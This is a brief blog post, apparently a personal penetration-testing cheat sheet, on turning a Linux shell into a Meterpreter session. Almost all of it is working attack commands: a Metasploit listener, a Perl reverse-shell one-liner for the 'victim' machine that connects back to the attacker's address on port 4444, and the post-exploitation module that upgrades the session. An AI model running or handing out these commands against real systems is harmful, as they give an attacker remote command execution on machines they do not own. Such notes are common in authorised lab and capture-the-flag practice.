---
layout: post
title:  "shell to meterpreter - linux"
date:   2022-01-01
categories: web
---


## listener

```
msfconsole -x "use exploit/multi/handler;set PAYLOAD cmd/unix/reverse_perl;set LHOST tun0;set LPORT 4444;exploit"
```

## victim

```bash
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"<my ip>:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```

## elevate meterpreter shell

```bash
background

use post/multi/manage/shell_to_meterpreter
set SESSION 1
exploit
```